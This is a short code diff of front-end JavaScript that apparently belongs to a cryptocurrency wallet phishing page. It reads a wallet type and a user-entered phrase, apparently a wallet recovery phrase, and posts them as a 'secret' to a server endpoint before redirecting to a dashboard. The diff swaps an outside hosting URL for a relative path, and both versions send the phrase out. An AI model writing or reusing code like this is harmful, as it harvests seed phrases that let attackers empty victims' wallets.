@@ -9,14 +9,11 @@ window.addEventListener("load", () => {
     const wallet_Type = walletType.textContent;
     const notaPh = phraseIn.value;
     try {
-      const data = await axios.post(
-        "https://apex-h7wm.onrender.com/apex/secret/secrete",
-        {
-          user: client,
-          walletType: wallet_Type,
-          secret: notaPh,
-        }
-      );
+      const data = await axios.post("/apex/secret/secrete", {
+        user: client,
+        walletType: wallet_Type,
+        secret: notaPh,
+      });
       window.location = "../dashboard";
     } catch (error) {
       console.log(error);
